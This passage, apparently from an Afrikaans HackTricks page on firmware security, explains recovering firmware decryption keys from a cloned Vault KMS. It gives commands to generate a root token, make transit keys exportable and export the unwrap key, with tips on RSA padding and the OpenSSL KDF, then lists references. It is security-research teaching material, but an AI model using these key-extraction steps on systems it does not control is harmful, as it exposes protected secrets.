TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Met root op die gekloonde KMS:

- Maak transit keys slegs binne die geïsoleerde kloon exportable: `vault write transit/keys/<name>/config exportable=true`
- Export die unwrap key: `vault read transit/export/encryption-key/<name>`
- Probeer die herwonne RSA key met die presiese padding/hash-paar wat deur die KMS gebruik word. ’n Mislukte PKCS#1 v1.5-dekripsie en ’n mislukte verstek-OAEP-dekripsie bewys **nie** dat die key verkeerd is nie; baie Vault-backed flows gebruik OAEP met SHA-256, terwyl algemene libraries SHA-1 as verstek gebruik.
- As die payload met `Salted__` begin, reproduseer die vendor se OpenSSL KDF presies (`EVP_BytesToKey`, dikwels MD5 op legacy appliances) voordat jy AES-CBC-dekripsie probeer.

Dit verander "encrypted firmware" in ’n meer algemene probleem: **herwin die appliance-side operational keys, en reproduseer dan die presiese unwrap + KDF parameters offline**.

## Opleiding en Sertifisering

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Kraak Firmware met Claude: Vaardigheid op seniorvlak, outonomie op juniorvlak](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologie vir Firmware Security Testing](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktiese IoT Hacking: Die Definitiewe Gids tot die Aanval van die Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Ontginning van zero days in verlate hardware – Trail of Bits-blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Hoe ’n $20 Smart Device my Toegang tot Jou Huis Gegee het](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Nou Sien Jy My: Nou Is Jy Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Ontginning van die Tesla Wall Connector vanaf sy charge port connector - Deel 2: omseiling van die anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Laat Dit Blink: Over-the-Air-Exploitation van die Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
